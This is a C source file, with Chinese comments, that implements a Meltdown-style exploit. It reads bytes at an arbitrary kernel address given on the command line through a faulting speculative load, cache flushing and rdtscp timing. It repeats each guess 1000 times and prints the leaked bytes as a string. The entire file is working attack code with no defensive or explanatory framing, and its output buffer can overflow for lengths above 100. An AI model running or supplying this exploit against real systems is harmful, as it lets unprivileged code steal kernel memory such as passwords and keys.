#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h> 
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#define pagesize 4096
jmp_buf jump;
static char volatile check[256*pagesize]={};
int time_calculate(volatile char *addr){
    unsigned long long  time_base,time_true;
    int tmp=0;
    time_base = __rdtscp(&tmp);
    __asm__ volatile("movl (%0), %%eax\n" : : "c"(addr) : "eax");//读取该字节
    time_true = __rdtscp(&tmp) - time_base;//总时间
    return time_true;
}
int  find_addr(){  
    int i,m;
    int volatile rand_i,min_i,min_time=2000,j,time;
    char *check_addr;
    for (i=0;i<256;i++){
        rand_i=((i * 167) + 13) & 255;
        check_addr=&check[pagesize*rand_i];
        time=time_calculate(check_addr);
        if (min_time > time){
            min_time=time;
            min_i=rand_i;
            j=i;
        }
    }
    return min_i;   
}
static void dealsth(int sig){
    (void)sig;
    siglongjmp(jump,1);
    //段错误跳回函数
}
attack(char* addr)
{	
	if (!sigsetjmp(jump,1)){
	__asm__ volatile (
		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"
		"movzx (%[addr]), %%rax\n\t"
        "shl $12, %%rax\n\t"
        "mov (%[target], %%rax, 1), %%rbx\n"
		:
		: [target] "r" (check),
		  [addr] "r" (addr)
		: "rax","rbx"
	);	
	}
}
int readbyte(int fd,char *addr){//运用meltdown原理读取指定地址addr内一个字节的内容
    int i;
    static char buf[256];
    memset(check, 1, sizeof(check));
    pread(fd, buf, sizeof(buf), 0);
    for (i=0;i<256;i++){
        _mm_clflush(&check[i*pagesize]);
    }    
    attack(addr);
    return find_addr();
}
int main(int argc, const char* * argv){
    signal(SIGSEGV,dealsth);//段错误跳回
    int score[256]={};
    char* addr;
    char buf[100];
    int tmp,len;
    int fd = open("/proc/version", O_RDONLY);
    int m,n;
    sscanf(argv[1],"%lx",&addr);//从其他命令读入
    sscanf(argv[2],"%d",&len);
    printf("addr：%lx length:%d\n",addr,len);
    for (int j=0;j<len;j++){
        memset(score,0,sizeof(score));
        for (int i=0;i<1000;i++){//进行1000次猜测
            score[readbyte(fd,addr)]++;
        }//选最大可能的
        for (m=n=0;m<256;m++){
        if (score[m]>score[n]) n=m;
        }
        tmp=n;
        printf("the %d byte:%c\n",j,tmp);  
        buf[j]=tmp;
        addr++;      
    }
	printf("%s",buf);
}
